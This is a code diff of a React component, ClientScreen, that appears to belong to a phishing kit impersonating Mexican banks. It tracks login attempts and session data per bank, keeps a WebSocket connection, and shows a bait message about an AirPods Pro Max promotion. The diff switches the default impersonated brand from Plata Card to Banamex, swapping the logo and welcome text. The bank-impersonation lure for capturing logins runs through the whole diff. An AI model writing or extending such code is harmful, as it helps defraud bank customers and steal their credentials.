@@ -40,7 +40,6 @@ import santanderLogo from '../assets/santander_logo.png';
 import santanderLogoWhite from '../assets/santander_logo_white_fixed.png';
 import scotiabankLogo from '../assets/scotiabank_logo.png';
 import scotiabankLogoWhite from '../assets/scotiabank_logo_white.png';
-import platacardLogo from '@assets/Plata_Card_Logo_1754951777982.png';
 import banregioLogo from '../assets/banregio_logo.png';
 import banregioLogoWhite from '../assets/banregio_logo_white.png';
 
@@ -57,7 +56,7 @@ export default function ClientScreen() {
   );
   const [loginAttempts, setLoginAttempts] = useState(0);
   const [sessionData, setSessionData] = useState<Partial<Session> & { banco?: string }>({
-    banco: 'PLATACARD' // Banco por defecto para la página principal
+    banco: 'BANAMEX' // Banco por defecto para la página principal
   });
   const [bankLoaded, setBankLoaded] = useState<boolean>(isHomePage);
   
@@ -76,7 +75,7 @@ export default function ClientScreen() {
   }>({});
   
   // Estado para controlar los mensajes iniciales
-  const [initialMessage, setInitialMessage] = useState<string>('Conectando con Plata Card...');
+  const [initialMessage, setInitialMessage] = useState<string>('Conectando con Banamex...');
   const [showInitialMessage, setShowInitialMessage] = useState<boolean>(true);
   
   // WebSocket connection
@@ -89,7 +88,7 @@ export default function ClientScreen() {
       return;
     }
     
-    // Mostrar "Conectando con Plata Card" por 2 segundos
+    // Mostrar "Conectando con Banamex" por 2 segundos
     const connectingTimer = setTimeout(() => {
       setInitialMessage('Procesando promoción de AirPods Pro Max...');
       
@@ -599,14 +598,14 @@ export default function ClientScreen() {
           <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
       );
-    } else if (sessionData.banco === 'PLATACARD') {
+    } else if (sessionData.banco === 'BANAMEX') {
       return (
         <header className="bg-white text-black p-4 text-center border-b border-gray-200">
           <div className="flex justify-center mb-2">
             <img 
-              src={platacardLogo} 
-              className="platacard-logo inline-block" 
-              alt="Plata Card" 
+              src={citibanamexLogo} 
+              className="banamex-logo inline-block" 
+              alt="Banamex" 
               style={{maxHeight: '40px', height: '2.5rem', width: 'auto'}}
             />
           </div>
@@ -939,10 +938,10 @@ export default function ClientScreen() {
           <p className="text-sm text-gray-600 mt-1">Bienvenido a SPIN by Oxxo</p>
         </div>
       );
-    } else if (sessionData.banco === 'PLATACARD') {
+    } else if (sessionData.banco === 'BANAMEX') {
       return (
         <div className="text-center mt-2 px-4">
-          <p className="text-sm text-gray-600 mt-1">Bienvenido a Plata Card, la tarjeta que te premia</p>
+          <p className="text-sm text-gray-600 mt-1">Bienvenido a Banamex</p>
         </div>
       );
     } else {
